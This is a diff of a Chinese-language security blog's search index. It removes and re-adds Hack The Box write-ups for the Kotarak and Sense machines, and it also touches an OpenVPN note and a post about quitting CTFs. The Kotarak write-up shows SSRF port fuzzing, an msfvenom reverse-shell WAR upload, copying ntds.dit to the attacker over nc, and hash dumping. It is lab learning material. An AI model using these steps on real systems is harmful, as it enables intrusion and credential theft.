@@ -4,75 +4,13 @@
   
   
   <entry>
-    <title>kotarak（ssrf+上传）</title>
-    <link href="/2021/05/25/2018-6-02-x/"/>
-    <url>/2021/05/25/2018-6-02-x/</url>
+    <title></title>
+    <link href="/2021/05/25/2017-11-27%E6%94%B6%E5%B0%BE-html/"/>
+    <url>/2021/05/25/2017-11-27%E6%94%B6%E5%B0%BE-html/</url>
     
-    <content type="html"><![CDATA[<h1 id="Kotarak（tomcat-web-server）"><a href="#Kotarak（tomcat-web-server）" class="headerlink" title="Kotarak（tomcat web server）"></a>Kotarak（tomcat web server）</h1><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a><strong>端口扫描</strong></h4><blockquote><p>22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)<br>8009/tcp open  ajp13  Apache Jserv (Protocol v1.3)<br>8080/tcp open  http    Apache Tomcat 8.5.5<br>Service Info: <strong>OS: Linux</strong>; CPE: cpe:/o:linux:linux_kernel</p></blockquote><p>首先访问<a href="http://10.10.10.55:8080，显示HTTP">http://10.10.10.55:8080，显示HTTP</a> Status 404 - /，状态码404 not found。于是枚举目录。</p><blockquote><p>dirb <a href="http://10.10.10.55:8080/">http://10.10.10.55:8080</a> </p></blockquote><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">+ http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.55</span>:<span class="hljs-number">8080</span>/docs (CODE:**<span class="hljs-number">302</span>**|SIZE:<span class="hljs-number">0</span>)<br><br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.55</span>:<span class="hljs-number">8080</span>/examples (CODE:<span class="hljs-number">302</span>|SIZE:<span class="hljs-number">0</span>)                         <br><br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.55</span>:<span class="hljs-number">8080</span>/favicon.ico (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">21630</span>)                   <br><br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.55</span>:<span class="hljs-number">8080</span>/host-manager (CODE:<span class="hljs-number">302</span>|SIZE:<span class="hljs-number">0</span>)                     <br><br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.55</span>:<span class="hljs-number">8080</span>/manager (CODE:<span class="hljs-number">302</span>|SIZE:<span class="hljs-number">0</span>)<br></code></pre></div></td></tr></table></figure><p>发现基本上都是302重定向。</p><p>于是访问下 <a href="http://10.10.10.55:8080/manager">http://10.10.10.55:8080/manager</a> （A地址）</p><p>发现302重定向到<a href="http://10.10.10.55:8080/manager/">http://10.10.10.55:8080/manager/</a> （B地址）</p><p>并且，B地址的状态码是404。但是404页面有个提示，tomcat 7重构并且有些urls已经改变。所有使用管理应用的urls现在应该使用如下选项：</p><blockquote><p>/manager/html for the HTML GUI<br>/manager/text for the text interface<br>/manager/jmxproxy for the JMX proxy<br> /manager/status for the status pages</p></blockquote><p>既然提示这么贴心了，那我们就按照所说的访问一下。</p><p>然后发现，所给的urls都需要<strong>登陆</strong>才能访问。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-02/2883590-ab8b47382ef604b6.png"></p><p>再搜索下 Apache Tomcat 8.5.5。<a href="http://blog.csdn.net/posonrick/article/details/72566875">参考</a></p><p>tomcat是java web服务器</p><p>尝试访问：<a href="http://10.10.10.55:8080/index.jsp">http://10.10.10.55:8080/index.jsp</a> ，200ok。</p><h1 id="SSRF-服务端请求伪造"><a href="#SSRF-服务端请求伪造" class="headerlink" title="SSRF-服务端请求伪造"></a>SSRF-服务端请求伪造</h1><p>没有经验的小白先跟whale学习下。<br>该漏洞经常出现在服务端，一些web应用程序经常从其他server获取信息。</p><blockquote><p>客户端 （去B服务器取回图片 !）——》A服务端（执行）————》B服务器（返回图片）————》A服务器（执行完毕）————》客户端（收到图片）</p></blockquote><h2 id="攻击方式："><a href="#攻击方式：" class="headerlink" title="攻击方式："></a>攻击方式：</h2><blockquote><p>客户端（去扫描B服务器 ！）——》A服务端（执行）————》B服务器（返回数据包）————》A服务器（执行完毕）————》客户端（收到扫描结果）</p></blockquote><p>服务器没有过滤客户端的请求。本来设计的功能想法是好的，但是攻击者不打算<strong>以设计者的想法</strong>来使用这个功能。</p><p>代码不多说，本文只讲讲实践部分，至于更深层次的漏洞原理和代码片段还需要各位自行学习。</p><p>再次扫描，全端口扫描</p><blockquote><p>nmap -p- -sV 目标的ip</p></blockquote><p>作者扫描出了一个开放在60000的端口，类型是未知。但是我扫描的结果是，需要8个多小时。。想了半天才想起来，目标机器是在美国，对于网速实在不能苛求。。（感觉好坑，天朝就没有这种试验靶场吗）</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-02/2.PNG"></p><p>扫描出了以后，用浏览器访问。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-02/%E6%8D%95%E8%8E%B7.PNG"></p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">使用这个私人的web浏览器匿名在网络冲浪，请不要滥用它。<br></code></pre></div></td></tr></table></figure><ul><li><p>Trying</p><figure class="highlight armasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs armasm"><span class="hljs-symbol">python</span> -m SimpleHTTPServer<br><span class="hljs-symbol">ifconfig</span><br>在本地开启服务器，查看本地<span class="hljs-built_in">ip</span>。<br></code></pre></div></td></tr></table></figure><p>尝试用浏览器上的该功能访问下本地，是否成功。<br>输入<code>http://本地ip：8000</code><br>浏览器跳转到一个地址<code>http://10.10.10.55:60000/url.php?path=http://本地ip:8000</code><br>成功访问客户端本地地址。</p></li><li><p>Trying</p></li></ul><p>然后尝试ssrf，提交<code>file:///etc/passwd</code><br>返回<code>try harder </code><br>尝试File FIlE  ,同样的返回结果。说明目标机可能用正则表达式限制了file这个字符。</p><ul><li>Trying<br>尝试<code>http://localhost:60000</code>  返60000端口上的正常页面。<br>因为端口扫描那一步<strong>客户端访问都是302重定向</strong>，需要登陆才能访问，于是我们通过60000端口上的“搜索”功能，绕过对客户端的限制。让服务器替我们获取想要的信息。</li></ul><h1 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h1><ul><li>这是一个web扫描软件<br>可以用<code>wfuzz -h</code> 查看使用方式<br>我们使用下列参数，扫描服务器开放的端口<br><code>wfuzz -c -z range,1-65535 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ</code></li></ul><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-02/3.PNG"><br>图片中，2 Ch是响应的字符串，访问后发现没有任何有价值的东西，于是我们忽略它。<br><code>wfuzz -c -z range,1-65535 --hl=2 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ</code><br>扫描后，我们得到了非2 Ch的响应结果。<br>看到了很多端口信息，因为<strong>客户端nmap扫描是远程访问</strong>，有 防火墙等等，所以在这里会得到更加详细的（在远程扫描不到的）端口信息。</p><ul><li> trying<br>一个一个访问这些开放了的端口，<code>http://10.10.10.55:60000/url.php?path=http://localhost:端口</code><br>在888端口，找到了一个备份页面backup。</li></ul><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-02/4.PNG"></p><ul><li>Trying</li></ul><p>访问备份页面的地址<code>http://10.10.10.55:60000/url.php?path=http://localhost:888/?doc=backup</code><br>url编码一下<code>http%3A%2f%2f10.10.10.55%3A60000%2furl.php%3Fpath%3Dhttp%3A%2f%2flocalhost%3A888%2f%3Fdoc%3Dbackup</code><br>得到了可能是tomcat配置文件中的用户名密码。</p><p>（有一个小技巧，在端口扫描那一步，得到了不能访问的文件名，可以用ssrf去访问，来获取敏感文件。）</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-02/5.PNG"><br>我们用这个口令登陆端口扫描那一步获得的地址<code>manager/html</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-02/6.PNG"></p><h4 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a><strong>获取shell</strong></h4><p>刚刚通过ssrf获取敏感文件，从而突破防线，接下来，我们要获取一个shell。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-02/7.PNG"><br>用msfvenom生成一个payload，接下来要将它上传到目标机上运行。<br>因为主页面上有上传功能，提示：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">deploy <span class="hljs-built_in">directory</span> <span class="hljs-keyword">or</span> WAR <span class="hljs-built_in">file</span> located <span class="hljs-keyword">on</span> <span class="hljs-title">server</span>.<br>war <span class="hljs-built_in">file</span> <span class="hljs-built_in">to</span> deploy <br>select war <span class="hljs-built_in">file</span> <span class="hljs-built_in">to</span> upload.<br></code></pre></div></td></tr></table></figure><p>暗示了我们可以上传一个war类型的反弹shell。</p><blockquote><p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=kali的ip LPORT=80 -f war &gt; ippsec.war</p></blockquote><p><code>War——web归档文件，war文件用于封装web模块。web模块可以代表一个独立的web应用程序。</code></p><ul><li><p>Trying<br>成功上传——本地nc监听80端口<code>nc -lnvp 80</code>——浏览器访问payload地址，即可获得一个shell。</p></li><li><p>shell中运行<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code> 于是获得一个bash shell。</p></li></ul><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a><strong>提权</strong></h4><p>cd backups<br>ls 发现tomcat-users.xml<br>cat *.xml 显示权限不够<br>cd home<br>find .<br>cd tomcat/to_archive/pentest_data/<br>ls<br>发现两个文件，<code>.dit</code>,<code>.bin</code> </p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-02/%E6%8D%95%E8%8E%B7%202.PNG" alt="说明这是windows域的文件"></p><p>file *<br>说明<code>.dit</code>是data类型，<code>.bin</code>是微软windows registry文件。</p><ul><li><p>Trying: nc传文件。<br>kali中运行：<br><code>nc -lvnp 443 &gt; ntds.dit</code><br>shell中运行：<br><code>nc 攻击机IP 443 &lt; xx.dit</code><br>.dit需要输入全称哈，这里省略了。</p></li><li><p>Trying: 提取.bin文件<br>impacket-secretsdump -h<br><code>impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL</code><br>得到了Target system bootKey，关于域渗透知识，还欠缺。<br>得到了一系列用户名和密码的hash值。</p></li><li><p>Trying: tomcat的反弹shell中，运行<br>arp -a 查看局域网机器<br>获得<code>10.10.10.2</code> <code>10.0.3.133</code>两个机器的IP</p></li><li><p>Trying: 对这两台机器进行扫描<br>运行nmap， 显示try harder!<br>用nc进行端口扫描，</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">10.0.3.133</span> <span class="hljs-number">445</span>连接拒绝<br><span class="hljs-attribute">nc</span> -v <span class="hljs-number">10.0.3.133</span> <span class="hljs-number">22</span>成功连接<br></code></pre></div></td></tr></table></figure><p>并且显示ssh版本为，openssh，操作系统为ubuntu。</p></li><li><p>Trying: 在线对hash进行解密<br>先删除明显是windows机器的hash，浏览器搜索hashkiller，对剩下的hash解密。<br><code>awk -F: &#39;&#123;print $4&#125;&#39; hashes</code></p></li><li><p>Trying: 尝试ssh登陆<br>ssh <a href="mailto:&#97;&#x74;&#x61;&#110;&#x61;&#x73;&#64;&#x31;&#48;&#46;&#x31;&#48;&#x2e;&#49;&#x30;&#x2e;&#53;&#x35;">&#97;&#x74;&#x61;&#110;&#x61;&#x73;&#64;&#x31;&#48;&#46;&#x31;&#48;&#x2e;&#49;&#x30;&#x2e;&#53;&#x35;</a><br>尝试了一个遍，失败</p></li><li><p>Trying: tomcat的反弹shell中，尝试切换用户<br>su - atanas<br>使用解密出来的一个密码，成功切换到该用户<br>cd root<br>cat app.log</p></li><li><p>Trying: 利用wget命令执行漏洞<br>searchsploit wget<br>searchsploit -m exploits/linux/remote/40064.txt</p></li></ul>]]></content>
-    
-    
-    <categories>
-      
-      <category>training</category>
-      
-    </categories>
+    <content type="html"><![CDATA[<hr><p>{.container}<br>::: {.post}<br>::: {.show-content}<br>这一个月以来做题做的不亦乐乎，但这两天遇到了瓶颈。</p><p>据说CTF的分数是个分段指数函数。\</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-e6c3c23a33c2e729.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>抄的知乎上的<br>:::<br>:::</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-31b7529a020b54d5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>我从0分段，到了低分段。。。在玩下去，已经没意思了，该看书提升了。</p><p>这段时间玩CTF还是有些收获，下了一些知名软件的基本用法，了解了一些基础知识。</p><p>CTF做题，就告一段落吧。。。。。。。。。。。。。。。<br>:::<br>:::<br>:::</p>]]></content>
     
     
-    <tags>
-      
-      <tag>training</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>sense(pfsense-命令执行)</title>
-    <link href="/2021/05/25/2018-3-29-x/"/>
-    <url>/2021/05/25/2018-3-29-x/</url>
-    
-    <content type="html"><![CDATA[<p>第一次在hack-the-box做实验，还是选个简单的吧，免得信心被打击得怀疑人生。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-20/2883590-c23ca97dc60e8680.PNG" alt="2883590-c23ca97dc60e8680"></p><h1 id="侦察："><a href="#侦察：" class="headerlink" title="侦察："></a>侦察：</h1><p><a href="http://10.10.10.60/">http://10.10.10.60</a></p><p>访问该网站，有一个登陆表单。侦察的手段和用到工具以前讲过的就不提了，不然文章太冗长了。</p><h4 id="1-随便输入用户名和密码。"><a href="#1-随便输入用户名和密码。" class="headerlink" title="1.随便输入用户名和密码。"></a>1.随便输入用户名和密码。</h4><p>提示：Username or Password incorrect</p><h4 id="2-尝试输入admin-admin，提示："><a href="#2-尝试输入admin-admin，提示：" class="headerlink" title="2.尝试输入admin/admin，提示："></a>2.尝试输入admin/admin，提示：</h4><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-20/2883590-b088f032fff6992d.PNG" alt="2883590-b088f032fff6992d"></p><p>什么情况？! 猜测，可能是js脚本有检测跨站脚本攻击csrf的代码，em………总之验证crsf没有通过，要看看js脚本才知道怎么回事。</p><h4 id="3-F12查看网络交互"><a href="#3-F12查看网络交互" class="headerlink" title="3.F12查看网络交互"></a>3.F12查看网络交互</h4><blockquote><p>index.php</p><p><strong>jquery.js</strong></p><p><strong>niftyjsCode.js</strong></p><p>csrf-magic.js</p><p>css和gif文件应该不重要，重点分析php脚本和js脚本。</p></blockquote><p><strong>网站文件存在的路径：</strong></p><p><a href="https://10.10.10.60/csrf/csrf-magic.js">https://10.10.10.60/csrf/csrf-magic.js</a></p><p><a href="https://10.10.10.60/themes/**pfsense**_ng/javascript/niftyjsCode.js">https://10.10.10.60/themes/**pfsense**_ng/javascript/niftyjsCode.js</a></p><p><a href="https://10.10.10.60/javascript/jquery.js">https://10.10.10.60/javascript/jquery.js</a></p><p><a href="https://10.10.10.60/tree/">https://10.10.10.60/tree/</a></p><p><a href="https://10.10.10.60//xmlrpc.php">https://10.10.10.60//xmlrpc.php</a></p><p><a href="https://10.10.10.60/installer/installer.php">https://10.10.10.60/installer/installer.php</a></p><h4 id="4-提交的参数："><a href="#4-提交的参数：" class="headerlink" title="4.提交的参数："></a>4.提交的参数：</h4><p>表单提交方式是post，有四个参数，两个自定义参数，usernamefld/passwordfld，两个默认参数，__csrf_magic和login。</p><h4 id="5-配置等info："><a href="#5-配置等info：" class="headerlink" title="5.配置等info："></a>5.配置等info：</h4><blockquote><p>cms：SilverStripe /version？                   php-version：?               web-server：lighttpd/1.4.35</p></blockquote><h4 id="6-可能的弱点："><a href="#6-可能的弱点：" class="headerlink" title="6.可能的弱点："></a>6.可能的弱点：</h4><p>6.1-Site appears vulnerable to the ‘shellshock’ vulnerability (<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278</a>).</p><p>搜索shellshock，看不懂。</p><p>6.2 搜索SilverStripe Tree Control，于是找到了一个方向，或许有cms漏洞。<a href="https://www.cvedetails.com/cve/CVE-2015-5063/">cve detail</a></p><p>然后尝试xss，，</p><hr><p>em……….做不出来，没有sql bug与brute force就不能突破防线了么，╯︿╰ 桑心</p><p><a href="https://forum.hackthebox.eu/discussion/132/sense">论坛讨论地址</a>，看到有人跟我一样我就放心了，但是他们只会说“加油，你可以的，多侦察，做调查，仔细点！”，我：“******！xxx！x！（此处屏蔽违禁词汇）”</p><p>dirbuster真的枚举不出来什么啊</p><p>o(︶︿︶)o</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-20/2883590-4d157fc9ea214e0f.PNG" alt="2883590-4d157fc9ea214e0f"></p><h4 id="7-看攻略说是字典-工具的问题。"><a href="#7-看攻略说是字典-工具的问题。" class="headerlink" title="7.看攻略说是字典/工具的问题。"></a>7.看攻略说是字典/工具的问题。</h4><p>说明我用dirbuster默认字典没有扫到关键的文档。</p><p>/usr/share/dirb/wordlists/common.txt        没有扫出</p><hr><p><a href="https://v3ded.github.io/ctf/htb-sense.html">writeup地址</a>：</p><p>第三步信息搜集时，有一个链接暗示了<a href="https://10.10.10.60/themes/**pfsense**_ng/javascript/niftyjsCode.js">https://10.10.10.60/themes/**pfsense**_ng/javascript/niftyjsCode.js</a></p><p>pfsense是一个开源防火墙程序</p><p>gobuster -u <a href="https://10.10.10.60/">https://10.10.10.60/</a>-w/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt-e</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>该目标机，不能够爆破。哪怕多输错几次账号/密码，都会拒绝访问。</p><p>但是很巧妙的是，将口令藏在文件中，如果工具发现，那就能够做。</p><p>回顾半年前，我尝试的这个字典“/usr/share/dirb/wordlists/common.txt  ”，能够成功找到敏感文件，那才奇怪。说明我对工具一点都不熟悉。菜的一笔==</p><p>常用的枚举网站路径的地址：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster/directory-list-<span class="hljs-number">2.3</span>-medium.txt<br></code></pre></div></td></tr></table></figure><p>找到了两个敏感文件，一个提示了pfsense版本，一个给了用户名密码。</p><p>用msf，search pfsense，命令执行漏洞的exp，直接获取root权限。</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>training</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>training</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>openvpn</title>
-    <link href="/2021/05/25/2018-2-11-x/"/>
-    <url>/2021/05/25/2018-2-11-x/</url>
-    
-    <content type="html"><![CDATA[<p>学习下vpn的用法，所谓vpn就是虚拟专用网络。（不懂的人请仔细阅读《计算机网络-第四版》这里就不展开了）。</p><p>openvpn是一个软件，可以通过该软件，连接到专用网络。</p><p>尝试连接一个vpn网络，属于hack the box实验室。</p><blockquote><p><code>openvpn --version</code>  该命令可查看软件版本</p></blockquote><p>连接步骤：1.下载openvpn的配置文件。2.连接（需要openvpn软件客户端安装并正确配置）</p><blockquote><p><code>openvpn --config whale3070.ovpn</code></p></blockquote><p>initialization sequence completed<br>说明连接成功了。</p><blockquote><p><code>ifconfig</code></p></blockquote><p>显示：eth0，这是本地网卡，192.168.1.107 ，255.255.255.0</p><div class="hljs code-wrapper"><pre><code>       tun0，发现多了一个网络，10.10.15.14，子网掩码：255.255.254.0</code></pre></div><p>于是可以用python脚本计算下网段，再扫下网段</p><p><code>nmap -sn 10.10.14.0/23</code></p><p>10.10.14.1 估计是网关</p><p>10.10.15.24  本机</p><p>好了，openvpn就连上了，可以愉快地做实验了。</p><p>后台运行方式：</p><figure class="highlight brainfuck"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs brainfuck"><span class="hljs-comment">openvpn</span> --<span class="hljs-comment">config</span> <span class="hljs-comment">whale3070</span><span class="hljs-string">.</span><span class="hljs-comment">ovpn</span> --<span class="hljs-comment">daemon</span> <span class="hljs-comment">hackthebox</span><br></code></pre></div></td></tr></table></figure>]]></content>
-    
-    
-    <categories>
-      
-      <category>tools</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>tools</tag>
-      
-    </tags>
     
   </entry>
   
@@ -6068,6 +6006,31 @@
   
   
   <entry>
+    <title>kotarak（ssrf+上传）</title>
+    <link href="/2018/06/02/x/"/>
+    <url>/2018/06/02/x/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Kotarak（tomcat-web-server）"><a href="#Kotarak（tomcat-web-server）" class="headerlink" title="Kotarak（tomcat web server）"></a>Kotarak（tomcat web server）</h1><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a><strong>端口扫描</strong></h4><blockquote><p>22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)<br>8009/tcp open  ajp13  Apache Jserv (Protocol v1.3)<br>8080/tcp open  http    Apache Tomcat 8.5.5<br>Service Info: <strong>OS: Linux</strong>; CPE: cpe:/o:linux:linux_kernel</p></blockquote><p>首先访问<a href="http://10.10.10.55:8080，显示HTTP">http://10.10.10.55:8080，显示HTTP</a> Status 404 - /，状态码404 not found。于是枚举目录。</p><blockquote><p>dirb <a href="http://10.10.10.55:8080/">http://10.10.10.55:8080</a> </p></blockquote><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">+ http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.55</span>:<span class="hljs-number">8080</span>/docs (CODE:**<span class="hljs-number">302</span>**|SIZE:<span class="hljs-number">0</span>)<br><br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.55</span>:<span class="hljs-number">8080</span>/examples (CODE:<span class="hljs-number">302</span>|SIZE:<span class="hljs-number">0</span>)                         <br><br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.55</span>:<span class="hljs-number">8080</span>/favicon.ico (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">21630</span>)                   <br><br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.55</span>:<span class="hljs-number">8080</span>/host-manager (CODE:<span class="hljs-number">302</span>|SIZE:<span class="hljs-number">0</span>)                     <br><br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.55</span>:<span class="hljs-number">8080</span>/manager (CODE:<span class="hljs-number">302</span>|SIZE:<span class="hljs-number">0</span>)<br></code></pre></div></td></tr></table></figure><p>发现基本上都是302重定向。</p><p>于是访问下 <a href="http://10.10.10.55:8080/manager">http://10.10.10.55:8080/manager</a> （A地址）</p><p>发现302重定向到<a href="http://10.10.10.55:8080/manager/">http://10.10.10.55:8080/manager/</a> （B地址）</p><p>并且，B地址的状态码是404。但是404页面有个提示，tomcat 7重构并且有些urls已经改变。所有使用管理应用的urls现在应该使用如下选项：</p><blockquote><p>/manager/html for the HTML GUI<br>/manager/text for the text interface<br>/manager/jmxproxy for the JMX proxy<br> /manager/status for the status pages</p></blockquote><p>既然提示这么贴心了，那我们就按照所说的访问一下。</p><p>然后发现，所给的urls都需要<strong>登陆</strong>才能访问。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-02/2883590-ab8b47382ef604b6.png"></p><p>再搜索下 Apache Tomcat 8.5.5。<a href="http://blog.csdn.net/posonrick/article/details/72566875">参考</a></p><p>tomcat是java web服务器</p><p>尝试访问：<a href="http://10.10.10.55:8080/index.jsp">http://10.10.10.55:8080/index.jsp</a> ，200ok。</p><h1 id="SSRF-服务端请求伪造"><a href="#SSRF-服务端请求伪造" class="headerlink" title="SSRF-服务端请求伪造"></a>SSRF-服务端请求伪造</h1><p>没有经验的小白先跟whale学习下。<br>该漏洞经常出现在服务端，一些web应用程序经常从其他server获取信息。</p><blockquote><p>客户端 （去B服务器取回图片 !）——》A服务端（执行）————》B服务器（返回图片）————》A服务器（执行完毕）————》客户端（收到图片）</p></blockquote><h2 id="攻击方式："><a href="#攻击方式：" class="headerlink" title="攻击方式："></a>攻击方式：</h2><blockquote><p>客户端（去扫描B服务器 ！）——》A服务端（执行）————》B服务器（返回数据包）————》A服务器（执行完毕）————》客户端（收到扫描结果）</p></blockquote><p>服务器没有过滤客户端的请求。本来设计的功能想法是好的，但是攻击者不打算<strong>以设计者的想法</strong>来使用这个功能。</p><p>代码不多说，本文只讲讲实践部分，至于更深层次的漏洞原理和代码片段还需要各位自行学习。</p><p>再次扫描，全端口扫描</p><blockquote><p>nmap -p- -sV 目标的ip</p></blockquote><p>作者扫描出了一个开放在60000的端口，类型是未知。但是我扫描的结果是，需要8个多小时。。想了半天才想起来，目标机器是在美国，对于网速实在不能苛求。。（感觉好坑，天朝就没有这种试验靶场吗）</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-02/2.PNG"></p><p>扫描出了以后，用浏览器访问。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-02/%E6%8D%95%E8%8E%B7.PNG"></p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">使用这个私人的web浏览器匿名在网络冲浪，请不要滥用它。<br></code></pre></div></td></tr></table></figure><ul><li><p>Trying</p><figure class="highlight armasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs armasm"><span class="hljs-symbol">python</span> -m SimpleHTTPServer<br><span class="hljs-symbol">ifconfig</span><br>在本地开启服务器，查看本地<span class="hljs-built_in">ip</span>。<br></code></pre></div></td></tr></table></figure><p>尝试用浏览器上的该功能访问下本地，是否成功。<br>输入<code>http://本地ip：8000</code><br>浏览器跳转到一个地址<code>http://10.10.10.55:60000/url.php?path=http://本地ip:8000</code><br>成功访问客户端本地地址。</p></li><li><p>Trying</p></li></ul><p>然后尝试ssrf，提交<code>file:///etc/passwd</code><br>返回<code>try harder </code><br>尝试File FIlE  ,同样的返回结果。说明目标机可能用正则表达式限制了file这个字符。</p><ul><li>Trying<br>尝试<code>http://localhost:60000</code>  返60000端口上的正常页面。<br>因为端口扫描那一步<strong>客户端访问都是302重定向</strong>，需要登陆才能访问，于是我们通过60000端口上的“搜索”功能，绕过对客户端的限制。让服务器替我们获取想要的信息。</li></ul><h1 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h1><ul><li>这是一个web扫描软件<br>可以用<code>wfuzz -h</code> 查看使用方式<br>我们使用下列参数，扫描服务器开放的端口<br><code>wfuzz -c -z range,1-65535 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ</code></li></ul><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-02/3.PNG"><br>图片中，2 Ch是响应的字符串，访问后发现没有任何有价值的东西，于是我们忽略它。<br><code>wfuzz -c -z range,1-65535 --hl=2 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ</code><br>扫描后，我们得到了非2 Ch的响应结果。<br>看到了很多端口信息，因为<strong>客户端nmap扫描是远程访问</strong>，有 防火墙等等，所以在这里会得到更加详细的（在远程扫描不到的）端口信息。</p><ul><li> trying<br>一个一个访问这些开放了的端口，<code>http://10.10.10.55:60000/url.php?path=http://localhost:端口</code><br>在888端口，找到了一个备份页面backup。</li></ul><p><img 